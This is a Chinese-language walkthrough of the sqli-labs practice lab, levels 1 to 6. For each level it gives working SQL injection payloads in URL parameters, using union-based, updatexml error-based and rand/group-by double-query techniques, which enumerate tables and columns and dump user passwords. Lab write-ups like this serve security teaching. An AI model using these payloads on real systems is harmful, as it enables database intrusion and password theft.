# sqli-labs wp

## less-1

字符型注入

?id=1' order by 3--+有回显

?id=1' order by 4--+无回显

?id=' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema =database()--+查出来表名

?id=' union select 1,group_concat(column_name) ,1 from information_schema.columns where table_schema =database() and table_name='users'--+查出来列名

?id=' union select 1,group_concat(password) ,1 from users--+查出来密码



## less-2

?id=1 and updatexml(0x7e,concat(0x7e,database()),0x7e) --+报错注入常用语句

?id=1 and updatexml(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e) --+查表名

?id=1 and updatexml(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema =database() and table_name='users'),0x7e) --+查列名

?id=1 and updatexml(0x7e,(select group_concat(password)  from users),0x7e) --+爆数据



## less-3

这个题目的查询语句最后用了limit 0,1，导致参数需要同时闭合引号和括号，根据题目提示，需要使用报错注入

?id=2') and updatexml(0x7e,concat(0x7e,database()),0x7e) --+查库名

?id=2') and updatexml(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e) --+查表名

?id=2') and updatexml(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),0x7e)--+查列名

?id=2') and updatexml(0x7e,(select group_concat(password) from users),0x7e)--+爆数据

## less-4

双引号绕过

内容与less-3类似，查密码是

?id=1") and updatexml(0x7e,(select group_concat(password) from users),0x7e)--+



## less-5

double injection

?id=1' union select count(*),1,concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a--+

concat和rand一起用可能会在分组时产生重复键错误，从而把错误信息发送给用户，这个漏洞概率触发，所以需要多次发包

?id=1' union select count(*),1,concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a--+

?id=1' union select count(*),1,concat((select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),floor(rand()*2)) as a from information_schema.tables group by a--+

?id=1' union select count(*),1,concat((select group_concat(password) from users),floor(rand()*2)) as a from information_schema.tables group by a--+

##### 但是，使用了group_concat大大降低了查询报错率，所以放弃使用此函数，转而去用limit

```
?id=1' union select count(*),1,concat((select password from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+

?id=1' union select count(*),1,concat((select password from users limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+
```





less-6

就是闭合方式变成了双引号

与less5相同